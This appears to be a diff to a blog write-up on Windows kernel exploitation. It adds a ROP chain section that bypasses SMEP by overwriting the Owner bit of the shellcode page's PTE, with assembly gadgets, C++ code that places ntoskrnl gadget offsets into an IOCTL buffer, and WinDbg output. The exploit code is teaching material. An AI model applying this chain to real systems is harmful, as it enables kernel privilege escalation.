@@ -244,8 +244,23 @@ ULONGLONG wantedPteValue = readBuffer & ~0x4;
 Now we know what data we want to write (wantedPteValue) and where to write it to (shellcodePte). The actual writing will happen in the rop chain because we don't have an arbitrary write primitive.  
 
 ## Putting it all together
-
-*INSERT ROP BUILDING HERE*
+The rop chain should do this:
+```x86asm
+pop rcx             ; rcx = shellcode's PTE address
+pop rax             ; rax = wanted pte value
+mov [rcx], rax      ; overwrite Owner bit in the PTE
+ret                 ; return to shellcode
+```
+So in our code it's like this:
+```cpp
+// Prepare the ROP chain
+*(ULONGLONG*)(inBuf + 568) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RCX);
+*(ULONGLONG*)(inBuf + 576) = (ULONGLONG)(shellcodePte);
+*(ULONGLONG*)(inBuf + 584) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RAX);
+*(ULONGLONG*)(inBuf + 592) = (ULONGLONG)(wantedPteValue);
+*(ULONGLONG*)(inBuf + 600) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + MOV_RAX_TO_PTR_RCX);
+* (ULONGLONG*)(inBuf + 608) = (ULONGLONG)(shellcode);
+```
 
 Tracing the exploit, we that our SMEP bypass worked and we successfully switched the Owner bit to Kernel mode.
 The shellcode address is ```0x27e04bd0000``` and we'll use the ```!pte``` command that shows us the parsed PTE struct:
@@ -258,8 +273,8 @@ pfn 78189     ---DA--UWEV  pfn 8000a     ---DA--UWEV  pfn 7c58b     ---DA--UWEV 
 ```
 PXE/PTE/PPE all indicate "U", as it should be, because it's really a user mode address. But the PTE shows "K" because we changed it with our exploit.
 Continuing the exploit now will result in an exception: ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY.  
-This is a known BSOD that comes from... SMEP protection?!
-![](/assets/images/bof_gs/butwhy_small.jpg)
+This is a known BSOD that comes from... SMEP protection?!  
+![](/assets/images/bof_gs/butwhy_small.jpg)  
 
 After some debugging I got a tip that maybe it's a cache problem. Of course! that's all the point of the [TLB](https://en.wikipedia.org/wiki/Translation_lookaside_buffer).  
 The TLB is a small buffer in the CPU that caches page table entries of recently accessed virtual memory addresses.
